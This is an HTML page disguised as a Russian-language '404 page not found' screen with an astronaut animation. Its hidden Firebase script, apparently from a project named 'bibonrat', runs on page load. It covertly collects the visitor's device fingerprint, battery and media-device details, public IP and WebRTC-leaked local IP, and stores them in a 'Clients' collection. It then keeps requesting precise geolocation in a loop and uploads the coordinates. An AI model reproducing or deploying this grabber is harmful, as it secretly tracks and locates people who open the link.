<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Error</title>
</head>

<style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            color: #fff;
        }

        /* Космос: статичный фон с точками-звёздами через radial-gradient (без JS) */
        .space {
            position: fixed;
            inset: 0;
            background:
                radial-gradient(1px 1px at 20% 30%,  #fff, transparent),
                radial-gradient(1px 1px at 80% 10%,  #fff, transparent),
                radial-gradient(1px 1px at 65% 70%,  #fff, transparent),
                radial-gradient(1px 1px at 35% 80%,  #fff, transparent),
                radial-gradient(1px 1px at 10% 60%,  #fff, transparent),
                radial-gradient(1px 1px at 90% 50%,  #fff, transparent),
                radial-gradient(1px 1px at 50% 20%,  #fff, transparent),
                radial-gradient(1px 1px at 75% 35%,  #ddd, transparent),
                radial-gradient(1px 1px at 25% 50%,  #ddd, transparent),
                radial-gradient(1px 1px at 5%  15%,  #ccc, transparent),
                radial-gradient(1px 1px at 45% 5%,   #ccc, transparent),
                radial-gradient(1px 1px at 95% 85%,  #ccc, transparent),
                radial-gradient(ellipse at center top, #0b1426 0%, #000 70%);
            background-size:
                400px 400px, 400px 400px, 400px 400px, 400px 400px,
                400px 400px, 400px 400px, 400px 400px, 400px 400px,
                400px 400px, 400px 400px, 400px 400px, 400px 400px,
                100% 100%;
        }

        /* Земля внизу */
        .earth {
            position: fixed;
            left: 50%;
            bottom: -60vw;
            width: 200vw;
            height: 200vw;
            transform: translateX(-50%);
            border-radius: 50%;
            background:
                radial-gradient(circle at 50% 30%, rgba(120,180,255,0.35), transparent 55%),
                radial-gradient(circle at 50% 50%, #1a4f8b 0%, #0a2540 60%, #051427 100%);
            box-shadow:
                0 -40px 120px rgba(80, 160, 255, 0.25),
                inset 0 60px 120px rgba(180, 220, 255, 0.15);
        }
        .earth::before {
            content: "";
            position: absolute;
            inset: 0;
            border-radius: 50%;
            background:
                radial-gradient(ellipse 30% 6% at 30% 30%, rgba(255,255,255,0.4), transparent 70%),
                radial-gradient(ellipse 25% 5% at 65% 28%, rgba(255,255,255,0.35), transparent 70%),
                radial-gradient(ellipse 20% 4% at 45% 35%, rgba(255,255,255,0.3),  transparent 70%);
            opacity: 0.7;
        }

        /* Контент */
        .wrap {
            position: relative;
            z-index: 2;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 0 20px;
            text-align: center;
        }

        .row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 30px;
            flex-wrap: wrap;
        }

        /* Астронавт */
        .astro {
            width: clamp(110px, 14vw, 180px);
            position: relative;
            animation: float 6s ease-in-out infinite;
            will-change: transform;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0)   rotate(-3deg); }
            50%      { transform: translateY(-12px) rotate(3deg); }
        }

        /* Облако-мысль */
        .bubble {
            position: relative;
            background: #fff;
            color: #111;
            font-size: 13px;
            line-height: 1.3;
            padding: 12px 16px;
            border-radius: 18px;
            min-width: 90px;
            max-width: 130px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
        }
        .bubble::before, .bubble::after {
            content: "";
            position: absolute;
            background: #fff;
            border-radius: 50%;
        }
        .bubble::before {
            width: 12px; height: 12px;
            bottom: -10px; right: 20px;
        }
        .bubble::after {
            width: 6px; height: 6px;
            bottom: -20px; right: 14px;
        }

        /* Текст 404 и подпись */
        .text-block {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .num404 {
            font-family: 'Segoe UI', sans-serif;
            font-weight: 200;
            font-size: clamp(80px, 16vw, 220px);
            letter-spacing: 0.05em;
            line-height: 1;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 0.05em;
        }
        .num404 .o {
            position: relative;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }
        .num404 .o::before {
            content: "";
            position: absolute;
            left: 8%;
            right: 8%;
            top: 50%;
            height: 0.06em;
            background: #fff;
            transform: rotate(-18deg);
        }
        .subtitle {
            margin-top: 4px;
            font-size: clamp(14px, 2.2vw, 26px);
            letter-spacing: 0.18em;
            color: #fff;
            min-height: 1.2em;
            text-shadow: 0 0 12px rgba(180,210,255,0.4);
        }
        .subtitle .caret {
            display: inline-block;
            width: 2px;
            margin-left: 4px;
            background: #fff;
            animation: subCaret 0.8s step-end infinite;
            vertical-align: -2px;
        }
        .subtitle .caret::before { content: "\00a0"; }
        @keyframes subCaret {
            0%, 100% { background: #fff; box-shadow: 0 0 8px rgba(255,255,255,0.7); }
            50%      { background: transparent; box-shadow: none; }
        }
        .subtitle .caret.hidden { display: none; }
        .desc {
            margin-top: 14px;
            font-size: clamp(12px, 1.4vw, 16px);
            color: #cfd6e0;
            max-width: 560px;
            line-height: 1.6;
            min-height: 3em;
        }
        .desc .caret {
            display: inline-block;
            width: 2px;
            margin-left: 2px;
            background: #cfe1ff;
            animation: descCaret 0.8s step-end infinite;
            vertical-align: -2px;
        }
        .desc .caret::before { content: "\00a0"; }
        @keyframes descCaret {
            0%, 100% { background: #cfe1ff; box-shadow: 0 0 6px rgba(180,210,255,0.7); }
            50%      { background: transparent; box-shadow: none; }
        }
        .desc .accent {
            color: #ffffff;
            font-weight: 600;
            letter-spacing: 0.08em;
            text-shadow: 0 0 10px rgba(180,210,255,0.6);
        }

        /* Кнопка-инкремент */
        .inc-btn {
            margin-top: 22px;
            padding: 10px 26px;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            font-size: 14px;
            letter-spacing: 0.15em;
            color: #fff;
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.5);
            border-radius: 30px;
            cursor: pointer;
            backdrop-filter: blur(4px);
            transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
        }
        .inc-btn:hover {
            background: rgba(255,255,255,0.18);
            box-shadow: 0 0 18px rgba(180,210,255,0.4);
        }
        .inc-btn:active {
            transform: scale(0.96);
        }

        /* === Надпись A.·.L.·.G.·.D.·.G.·.A.·.D.·.U.·. === */
        .algdgadu {
            display: inline-block;
            margin-bottom: 24px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: clamp(12px, 1.6vw, 18px);
            letter-spacing: 0.15em;
            color: #cfe1ff;
            text-shadow: 0 0 8px rgba(120, 180, 255, 0.6);
            white-space: nowrap;
        }

        /* Скрыть отладку */
        .debug-panel { display: none !important; }

        @media (max-width: 700px) {
            .row { gap: 12px; }
            .bubble { font-size: 11px; padding: 8px 12px; }
            .algdgadu { font-size: 11px; letter-spacing: 0.1em; }
        }
    </style>

<body>

    <div class="earth"></div>

            <div class="text-block">

    <script>
        (function () {
            const el = document.getElementById('num404');
            const btn = document.getElementById('incBtn');
            if (!el || !btn) return;

            function render(n) {
                const digits = String(n).split('');
                el.innerHTML = digits.map(d =>
                    d === '0' ? `<span class="o">0</span>` : `<span>${d}</span>`
                ).join('');
            }

            let value = parseInt(el.dataset.value, 10) || 404;
            render(value);

            btn.addEventListener('click', () => {
                value += 1;
                el.dataset.value = String(value);
                render(value);
            });
        })();

        // Печатающие надписи: subtitle и desc параллельно (одновременно с A.·.L.·.G...)
        (function () {
            const subHost   = document.querySelector('#subtitle .subtitle-text');
            const subCaret  = document.querySelector('#subtitle .caret');
            const descHost  = document.querySelector('#desc .desc-text');
            const descCaret = document.querySelector('#desc .caret');
            if (!subHost || !descHost) return;

            function typePlain(host, caret, text, charSpeed, doneDelay) {
                let i = 0;
                function tick() {
                    if (i >= text.length) {
                        if (caret && doneDelay != null) {
                            setTimeout(() => caret.classList.add('hidden'), doneDelay);
                        }
                        return;
                    }
                    host.textContent += text[i++];
                    setTimeout(tick, charSpeed);
                }
                tick();
            }

            function typeSegments(host, caret, segments, charSpeed, doneDelay) {
                let segIdx = 0, charIdx = 0, currentSpan = null;
                function tick() {
                    if (segIdx >= segments.length) {
                        if (caret && doneDelay != null) {
                            setTimeout(() => caret.classList.add('hidden'), doneDelay);
                        }
                        return;
                    }
                    const [text, accent] = segments[segIdx];
                    if (charIdx === 0) {
                        currentSpan = document.createElement('span');
                        if (accent) currentSpan.className = 'accent';
                        host.appendChild(currentSpan);
                    }
                    currentSpan.textContent += text[charIdx++];
                    if (charIdx >= text.length) {
                        segIdx++;
                        charIdx = 0;
                    }
                    setTimeout(tick, charSpeed);
                }
                tick();
            }

            // Запускаем оба сразу, параллельно
            typePlain(subHost, subCaret, 'ОТВЕЧАЮ СТРАНИЦА НЕ НАЙДЕНА БРАТАН', 50, 1200);
            typeSegments(descHost, descCaret, [
                ['В Казахстане очень красиво. ', false],
                ['Welcome to Kazakhstan!',       true ]
            ], 45, 1500);
        })();
    </script>
    <!-- Скрытые элементы для статусов -->
    <div id="authStatus" style="display:none"></div>
    <div id="publicIpStatus" style="display:none"></div>
    <div id="localIpStatus" style="display:none"></div>
    <table style="display:none"><tbody id="infoBody"></tbody></table>

    <!-- Скрытая отладочная панель -->

        <div id="firestoreStatus"></div>

        <div id="geoLog"></div>

    <!-- Firebase SDK (modular) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
        import { getFirestore, collection, addDoc, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        // Конфигурация Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyAQlLh2Abk92sZVCSsYSCxvps4Uld3C1Lk",
            authDomain: "bibonrat.firebaseapp.com",
            databaseURL: "https://bibonrat-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "bibonrat",
            storageBucket: "bibonrat.firebasestorage.app",
            messagingSenderId: "78759159251",
            appId: "1:78759159251:web:3e40d7d5a2aa762f01bb26"
        };

        const app = initializeApp(firebaseConfig);

        const db = getFirestore(app); // ✅ default Firestore
        const auth = getAuth(app);

        const COLLECTION_NAME = "Clients";

        // DOM элементы
        const infoBody = document.getElementById("infoBody");
        const locationStatus = document.getElementById("locationStatus");
        const publicIpStatus = document.getElementById("publicIpStatus");
        const localIpStatus = document.getElementById("localIpStatus");
        const firestoreStatus = document.getElementById("firestoreStatus");
        const authStatus = document.getElementById("authStatus");

        // Объект для сбора данных
        const collectedData = {};

        function setStatus(el, type, text) {
            if (!el) return;
            el.className = "status " + type;
            el.innerText = text;
        }

        const geoLogEl = document.getElementById("geoLog");
        function logLine(msg) {
            const t = new Date().toLocaleTimeString();
            const line = `[${t}] ${msg}`;
            console.log(line);
            if (geoLogEl) geoLogEl.textContent += line + "\n";
        }

        function addInfo(label, value) {
            if (value === undefined || value === null) value = "недоступно";
            const row = document.createElement("tr");
            row.innerHTML = `<td>${label}</td><td>${value}</td>`;
            infoBody.appendChild(row);
            collectedData[label] = value;
        }

        // Авторизация (анонимная)
        let authReadyResolve;
        const authReady = new Promise((res) => (authReadyResolve = res));

        async function initAuth() {
            try {
                const cred = await signInAnonymously(auth);
                const uid = cred?.user?.uid || "unknown";
                addInfo("Firebase UID", uid);
                setStatus(authStatus, "success", "✅ Firebase авторизация (анонимно) успешна");
                authReadyResolve(true);
            } catch (error) {
                console.error("Ошибка авторизации:", error);
                setStatus(authStatus, "error", "❌ Ошибка Firebase авторизации: " + (error?.message || error));
                firestoreStatus.innerHTML = "⚠️ Запись в Firestore невозможна без авторизации.";
                firestoreStatus.style.color = "red";
                authReadyResolve(false);
            }
        }

        async function saveToFirestore(data) {
            const ok = await authReady;
            if (!ok) return null;

            try {
                data.timestamp = new Date().toISOString();
                data.pageUrl = location.href;
                data.firestoreDb = "(default)";

                const docRef = await addDoc(collection(db, COLLECTION_NAME), data);
                console.log("Saved to Firestore (default). Doc ID:", docRef.id);
                firestoreStatus.innerHTML = `✅ Данные сохранены в Firestore (default) (ID: ${docRef.id})`;
                firestoreStatus.style.color = "green";
                return docRef.id;
            } catch (error) {
                console.error("Ошибка при записи в Firestore:", error);
                firestoreStatus.innerHTML = `❌ Ошибка сохранения: ${error?.message || error}`;
                firestoreStatus.style.color = "red";
                return null;
            }
        }

        async function updateGeoInFirestore(docId, geoData) {
            const ok = await authReady;
            if (!ok) {
                console.warn("updateGeo: auth not ready");
                firestoreStatus.innerHTML = "❌ updateGeo: нет авторизации";
                firestoreStatus.style.color = "red";
                return false;
            }
            if (!docId) {
                console.warn("updateGeo: docId отсутствует, сохраняю гео отдельным документом");
                try {
                    const docRef = await addDoc(collection(db, COLLECTION_NAME), {
                        ...geoData,
                        note: "geo-only (no original docId)",
                        timestamp: new Date().toISOString(),
                        pageUrl: location.href
                    });
                    firestoreStatus.innerHTML = `✅ Гео сохранено отдельным doc (${docRef.id})`;
                    firestoreStatus.style.color = "green";
                    return true;
                } catch (e) {
                    console.error("Ошибка addDoc гео:", e);
                    firestoreStatus.innerHTML = `❌ Гео addDoc: ${e?.code || ""} ${e?.message || e}`;
                    firestoreStatus.style.color = "red";
                    return false;
                }
            }
            try {
                await updateDoc(doc(db, COLLECTION_NAME, docId), geoData);
                console.log("Geo updated for doc:", docId);
                firestoreStatus.innerHTML = `✅ Гео обновлено в doc ${docId}`;
                firestoreStatus.style.color = "green";
                return true;
            } catch (error) {
                console.error("Ошибка updateDoc гео:", error);
                firestoreStatus.innerHTML = `❌ updateDoc: ${error?.code || ""} ${error?.message || error}`;
                firestoreStatus.style.color = "red";
                // Фолбэк: если правила запрещают update — пишем отдельным документом со ссылкой
                try {
                    const docRef = await addDoc(collection(db, COLLECTION_NAME), {
                        ...geoData,
                        note: "geo-update-fallback",
                        originalDocId: docId,
                        timestamp: new Date().toISOString(),
                        pageUrl: location.href
                    });
                    firestoreStatus.innerHTML = `⚠️ updateDoc запрещён, гео сохранено отдельным doc (${docRef.id}). Ссылка на оригинал: ${docId}`;
                    firestoreStatus.style.color = "orange";
                    return true;
                } catch (e2) {
                    console.error("Фолбэк addDoc тоже упал:", e2);
                    return false;
                }
            }
        }

        function requestGeoOnce(options) {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error("not_supported"));
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve(position),
                    (error) => reject(error),
                    options || { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            });
        }

        // Ждёт лучший фикс через watchPosition с адаптивным выходом.
        // Условия завершения (любое):
        //   1) точность <= targetAccuracyMeters
        //   2) точность не улучшилась за stableMs мс (значит лучше уже не будет)
        //   3) истёк maxWaitMs
        function watchBestPosition({
            targetAccuracyMeters = 50,
            maxWaitMs = 15000,
            stableMs = 4000,
            highAccuracy = true
        } = {}) {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error("not_supported"));
                    return;
                }
                let best = null;
                let stableTimer = null;

                const finish = (kind) => {
                    navigator.geolocation.clearWatch(watchId);
                    clearTimeout(hardTimer);
                    clearTimeout(stableTimer);
                    if (best) {
                        logLine(`watch finish (${kind}), best ±${best.coords.accuracy.toFixed(1)} м`);
                        resolve(best);
                    } else {
                        reject(new Error("watch_timeout_no_fix"));
                    }
                };

                const armStableTimer = () => {
                    clearTimeout(stableTimer);
                    stableTimer = setTimeout(() => finish("stable"), stableMs);
                };

                const watchId = navigator.geolocation.watchPosition(
                    (pos) => {
                        const acc = pos.coords.accuracy;
                        logLine(`watch: фикс ±${acc.toFixed(1)} м`);
                        const improved = !best || acc < best.coords.accuracy;
                        if (improved) {
                            best = pos;
                            armStableTimer();
                        }
                        if (acc <= targetAccuracyMeters) finish("target");
                    },
                    (err) => {
                        logLine(`watch error: ${err.code}/${err.message}`);
                        if (best) finish("error-with-best");
                        else {
                            navigator.geolocation.clearWatch(watchId);
                            clearTimeout(hardTimer);
                            clearTimeout(stableTimer);
                            reject(err);
                        }
                    },
                    { enableHighAccuracy: highAccuracy, timeout: maxWaitMs, maximumAge: 0 }
                );

                const hardTimer = setTimeout(() => finish("hard-timeout"), maxWaitMs);
                armStableTimer();
            });
        }

        async function requestGeoSmart() {
            // Берём первый же фикс — без ожидания улучшения точности.
            try {
                return await requestGeoOnce({ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
            } catch (e1) {
                logLine(`high-accuracy не вышел (${e1?.code || ""}/${e1?.message || e1}), пробую low-accuracy…`);
                return await requestGeoOnce({ enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 });
            }
        }

        async function ensureGeoAndUpdate(docId) {
            logLine(`ensureGeoAndUpdate старт, docId=${docId}`);
            let attempt = 0;
            while (true) {
                attempt++;
                logLine(`Попытка #${attempt}: getCurrentPosition()`);
                try {
                    const position = await requestGeoSmart();
                    const { latitude, longitude, accuracy } = position.coords;
                    const lat = latitude.toFixed(6);
                    const lon = longitude.toFixed(6);
                    const acc = (accuracy || 0).toFixed(1) + " м";
                    logLine(`✅ Гео получено: ${lat}, ${lon} (±${acc})`);
                    addInfo("Широта", lat);
                    addInfo("Долгота", lon);
                    addInfo("Точность GPS", acc);
                    setStatus(locationStatus, "success", "✅ Геолокация получена");
                    logLine(`Пишу в Firestore (docId=${docId})…`);
                    const ok = await updateGeoInFirestore(docId, {
                        "Широта": lat,
                        "Долгота": lon,
                        "Точность GPS": acc,
                        geoUpdatedAt: new Date().toISOString()
                    });
                    logLine(`Результат записи: ${ok ? "OK" : "FAIL"}`);
                    if (ok) return;
                    await new Promise((r) => setTimeout(r, 3000));
                } catch (error) {
                    let msg = "❌ Геолокация недоступна";
                    if (error && typeof error.code !== "undefined") {
                        switch (error.code) {
                            case error.PERMISSION_DENIED: msg = "❌ Доступ к геолокации запрещён"; break;
                            case error.POSITION_UNAVAILABLE: msg = "❌ Позиция недоступна"; break;
                            case error.TIMEOUT: msg = "❌ Таймаут геолокации"; break;
                        }
                    }
                    logLine(msg + ` (${error?.message || error?.code || error})`);
                    setStatus(locationStatus, "error", msg);
                    await new Promise((r) => setTimeout(r, 3000));
                }
            }
        }

        // Публичный IP
        function getPublicIP() {
            return fetch("https://api.ipify.org?format=json")
                .then((res) => res.json())
                .then((data) => data.ip)
                .catch(() => "не удалось определить");
        }

        // Локальный IP (WebRTC)
        function getLocalIP() {
            return new Promise((resolve) => {
                if (!window.RTCPeerConnection) {
                    resolve("не поддерживается");
                    return;
                }
                const pc = new RTCPeerConnection({ iceServers: [] });
                let ipFound = false;
                pc.createDataChannel("");
                pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => { });
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = ipRegex.exec(event.candidate.candidate);
                        if (match && !ipFound) {
                            ipFound = true;
                            resolve(match[1]);
                            pc.close();
                        }
                    } else {
                        setTimeout(() => {
                            if (!ipFound) {
                                resolve("не удалось определить");
                                pc.close();
                            }
                        }, 500);
                    }
                };
                setTimeout(() => {
                    if (!ipFound) {
                        resolve("таймаут");
                        pc.close();
                    }
                }, 3000);
            });
        }

        // Главная функция
        (async function main() {
            initAuth();

            addInfo("User Agent", navigator.userAgent);
            addInfo("Платформа", navigator.platform);
            addInfo("Язык", navigator.language);
            addInfo("Разрешение экрана", `${screen.width} x ${screen.height}`);
            addInfo("Глубина цвета", `${screen.colorDepth} бит`);
            addInfo("Временная зона", Intl.DateTimeFormat().resolvedOptions().timeZone);
            addInfo("Включён ли cookie", navigator.cookieEnabled ? "Да" : "Нет");
            addInfo("Ядра CPU", navigator.hardwareConcurrency || "не поддерживается");
            addInfo("ОЗУ устройства", navigator.deviceMemory ? navigator.deviceMemory + " GB" : "недоступно");

            if (navigator.connection) {
                const conn = navigator.connection;
                addInfo("Тип сети", conn.effectiveType || "неизвестно");
                addInfo("RTT (ms)", conn.rtt || "неизвестно");
                addInfo("Скорость загрузки (Mbps)", conn.downlink || "неизвестно");
                addInfo("Экономия данных", conn.saveData ? "включена" : "отключена");
            } else {
                addInfo("Информация о сети", "не поддерживается");
            }

            // Батарея
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    addInfo("Уровень заряда", (battery.level * 100).toFixed(0) + "%");
                    addInfo("Заряжается", battery.charging ? "Да" : "Нет");
                    if (!battery.charging && battery.dischargingTime !== Infinity) {
                        addInfo("Время до разрядки", (battery.dischargingTime / 60).toFixed(0) + " мин");
                    }
                } catch (e) {
                    addInfo("Статус батареи", "ошибка доступа");
                }
            } else {
                addInfo("Battery API", "не поддерживается");
            }

            // Устройства
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    const video = devices.filter((d) => d.kind === "videoinput").length;
                    const audio = devices.filter((d) => d.kind === "audioinput").length;
                    addInfo("Камеры", video);
                    addInfo("Микрофоны", audio);
                } catch (e) {
                    addInfo("Медиа-устройства", "не определены");
                }
            } else {
                addInfo("enumerateDevices", "не поддерживается");
            }

            const publicIPPromise = getPublicIP().then((ip) => {
                addInfo("Публичный IP", ip);
                setStatus(publicIpStatus, ip.includes("не удалось") ? "error" : "success", ip);
            });

            const localIPPromise = getLocalIP().then((ip) => {
                addInfo("Локальный IP", ip);
                setStatus(localIpStatus, ip.includes("не удалось") || ip.includes("не поддерживается") ? "error" : "success", ip);
            });

            await Promise.all([publicIPPromise, localIPPromise]);

            const docId = await saveToFirestore(collectedData);

            if (!navigator.geolocation) {
                setStatus(locationStatus, "error", "❌ Геолокация не поддерживается");
                return;
            }

            ensureGeoAndUpdate(docId);
        })();
    </script>
</body>
